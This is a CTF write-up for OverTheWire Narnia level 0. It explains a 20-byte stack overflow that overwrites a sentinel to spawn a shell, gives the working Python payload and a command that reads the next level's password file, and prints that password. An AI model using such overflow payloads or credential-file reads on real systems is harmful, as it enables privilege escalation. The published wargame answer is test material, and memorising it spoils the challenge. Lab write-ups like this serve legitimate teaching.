# Narnia Level 00 to 01

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 0 -> 1 |
| Status | Complete |

## Objective

Recover the password for `narnia1` from the introductory stack-overflow binary.

## Given Access

User: `narnia0`

Password:

```text
narnia0
```

## Recon

`/narnia/narnia0.c` declares a 20-byte buffer and a sentinel `long val=0x41414141`. The program reads up to 24 bytes with `scanf("%24s", &buf)` and spawns `/bin/sh` if `val` becomes `0xdeadbeef`.

## Method

Overflow `buf` with 20 filler bytes followed by the little-endian bytes for `0xdeadbeef`. Keep stdin open with `cat` so the spawned shell stays alive long enough to read the next password file.

## Commands

```bash
ssh -p 2226 narnia0@narnia.labs.overthewire.org
(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*20+bytes.fromhex("efbeadde")+b"\n")'; cat) | /narnia/narnia0
whoami
cat /etc/narnia_pass/narnia1
```

## Result

Password for `narnia1`:

```text
WDcYUTG5ul
```

## Lesson

Even tiny overreads are enough when a stack-local sentinel controls privileged code flow.

## References

- https://overthewire.org/wargames/narnia/
